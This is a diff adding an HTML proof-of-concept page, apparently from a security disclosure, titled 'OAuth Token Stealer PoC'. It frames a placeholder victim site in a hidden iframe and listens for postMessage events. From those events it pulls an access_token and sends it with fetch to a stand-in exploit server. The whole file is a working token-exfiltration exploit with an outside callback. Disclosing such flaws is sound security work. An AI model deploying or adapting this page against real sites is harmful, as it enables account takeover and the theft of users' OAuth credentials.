@@ -1,0 +1,34 @@
+<!-- PoC for Dangerous JavaScript that handles query parameters and URL fragments-->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>OAuth Token Stealer PoC</h1>
+
+    <!-- Load the vuln site in an iframe -->
+    <iframe id="victim-frame"
+      src="https://VICTIM-SITE/path/client-id=...&redirect-url=...&nonce=..."
+      style="width:0;height:0;border:0"></iframe>
+
+    <script>
+      window.addEventListener("message", function (event) {
+        // Intercept all messages
+        console.log("Message received:", event.data);
+
+        // Search the access_token in the URL received
+        if (event.data?.type === "onload" && typeof event.data.data === "string") {
+          const url = event.data.data;
+          const match = url.match(/access_token=([^&]+)/);
+          if (match) {
+            const token = match[1];
+            console.log("TOKEN RUBATO:", token);
+
+            // Send all to your server
+            fetch("https://YOUR-EXPLOIT-SERVER/log?access-token="+token, {
+              method: "GET"
+            });
+          }
+        }
+      }, false);
+    </script>
+  </body>
+</html>
